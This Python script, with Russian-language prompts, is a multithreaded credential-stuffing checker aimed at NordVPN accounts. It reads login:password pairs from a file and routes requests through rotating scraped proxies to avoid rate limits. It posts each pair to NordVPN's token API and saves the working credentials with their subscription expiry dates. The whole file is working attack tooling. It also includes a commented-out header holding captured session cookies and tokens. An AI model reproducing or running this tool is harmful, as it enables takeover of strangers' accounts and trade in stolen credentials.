import time
from bs4 import BeautifulSoup
import requests
from loguru import logger
from random import choice
from threading import Thread
import multiprocessing

with open("config/accounts.txt", "r", encoding="utf-8") as file: data = file.read().split("\n")


class Nord():

    def __init__(self, UserChoice, Link):
        self.UserChoice = UserChoice
        self.Link = Link


    def ScrapProxy(self):
        while True:
            try:
                r = requests.get(self.Link)
                with open("config/proxies.txt", "w", encoding="utf-8") as file: file.write(str(r.text))
                proxylen = str(r.text).split('\n')
                logger.success(f"Обновил список прокси: {len(proxylen)} проксей")
                time.sleep(30)
            except:
                time.sleep(60)

    def check_proxy(self):
            try:
                while True:

                    with open("config/proxies.txt", "r", encoding="utf-8") as file:
                        proxy = file.read().split("\n")

                    RandomProxy = choice(proxy)

                    proxyDict = {}
                    if self.UserChoice == 1:
                        proxyDict = {
                            "http": "http://" + RandomProxy,
                            "https": "http://" + RandomProxy,
                        }
                    elif self.UserChoice == 2:
                        proxyDict = {
                            "http": "socks5://" + RandomProxy,
                            "https": "socks5://" + RandomProxy,
                        }

                    elif self.UserChoice == 2:
                        proxyDict = {
                            "http": "socks4://" + RandomProxy,
                            "https": "socks4://" + RandomProxy,
                        }

                    ip = requests.get("https://api64.ipify.org?format=json", proxies=proxyDict)

                    if int(ip.status_code) == 200:
                        return proxyDict

            except: pass

    def start(self):
          try:

                while True:
                    info = choice(data)

                    login = info.split(":")[0]
                    password = info.split(":")[1]

                    valid_proxy = self.check_proxy()

                    WhatRetry = self.checker(valid_proxy, login, password)

                    print(WhatRetry)

                    if WhatRetry == True:
                        data.remove(info)
                    elif WhatRetry == False:
                        data.remove(info)
                    elif WhatRetry == "retry":
                        continue

          except IndexError:
              print("Скрипт проверил все")
              time.sleep(100)
              return

          except Exception as ex:
              print(ex)

    def checker(self, proxy_list, username, password):

        url = 'https://api.nordvpn.com/v1/users/tokens'
        data = {'username': username, 'password': password}


        try:

            r = requests.post(url, json=data, proxies=proxy_list)

            if "Invalid username" in r.text:
                print(f'Невалид: {username}:{password}')
                return False
            if 'Unauthorized' in r.text:
                print(f'Невалид: {username}:{password}')
                return False
            if 'user_id' in r.text:



                logger.debug(r.text)
                time.sleep(2)


                headers = {
                    'authority': 'my.nordaccount.com',
                    'cache-control': 'max-age=0',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                    # Requests sorts cookies= alphabetically
                    # 'cookie': 'FirstSession=source%3Dgoogle%26campaign%3D(direct)%26medium%3Dorganic%26term%3D(not%20provided)%26content%3D%26hostname%3Dnordvpn.com%26date%3D20220323%26query%3Dnull; nextbid=GA1.2.54732d81-0b2f-4162-8890-00871d026b36; fontsCssCache=true; experiment=ucpExp-UpdaterUI.0; _gid=GA1.2.115786317.1648151165; PHPSESSID=42ca65fc2f964f644028d207bd850a4b; __cf_bm=F3.k3rzUNduwr5naxTQdJZQ8qGP4f.id7FUdaQkm4Ak-1648157269-0-AcHOJEWKGqOSknNjSOHosOEjeJDjUU6bGjMqSchCxva5pVSBlFzqkcZFPDEBWbduNrBF1ttyIookezWoBtz2eSbajm3hzK23hJzuIOyodkQlQRVPjHZyPKFHEdZoDzBdQSKxh7xB81G/H1YsT/THSGE0M2MQst6GhwuSUEWLr+8lU6DDyIZqkK72EgXW24dQFw==; ga_client_id=6fddf0de-8b39-4140-a9a9-fd05988b4e97; ucp_user_info=%2FJsMne%2FzGJTyYJZXqCayxm3i599ouCnTaMgDgrULeycI5PW8ZB1J9TdxUVY6%2FDE%3D; locale=en; CurrentSession=source%3Dgoogle%26campaign%3D(direct)%26medium%3Dorganic%26term%3D(not%20provided)%26content%3D%26hostname%3Dmy.nordaccount.com%26date%3D20220324%26query%3Dnull; token=RdOzRUKUjWFD5EnA%2BGxhPm3i599ouCnTaJsb07tPUi8B9r3gFzED2mYoRQgO%2FTinCpE6441v2L0VjcipyhQCXQRuctwPj%2FBS5KiioJQnUfMUA%2FACnn7zn5oeZXMDWjTBa87uGv81%2BeqhNIw0iua0D1Aa; _ga=GA1.2.1507586925.1648049427; _ga_HP7LGL9WKS=GS1.1.1648157273.3.1.1648158078.0',
                }


                r = requests.get(f'https://api.nordvpn.com/v1/users/services', headers=headers, auth=('token', r.json()['token']))
                expiry = r.json()[0]["expires_at"]
                logger.success(f'Валид: {username}:{password}\nИстекает: {expiry}\n')
                with open("config/valid.txt", "a", encoding="utf-8") as file: file.write(f"login: {username} | password: {password} | expiry: {expiry}\n")
                return True

            if 'Too Many Requests' in r.text:
                return "retry"

        except requests.exceptions.RequestException:
            return "retry"

        except Exception as ex:
            print(ex)
            return "retry"


def main():
    try:
        UserChoice = int(input("Выберите вид прокси:\n1 - HTTP / HTTPS\n2 - SOCKS5\n3 - SOCKS4\n\nВведите цифру: "))
        Link =  input("Введите прямую ссылку с прокси: ")
        Bot = Nord(UserChoice, Link)

        Thread(target=Bot.ScrapProxy).start()
        for i in range(0, 1000):
            Thread(target=Bot.start).start()

    except Exception as ex:
        print(ex)


if __name__ == "__main__":
    main()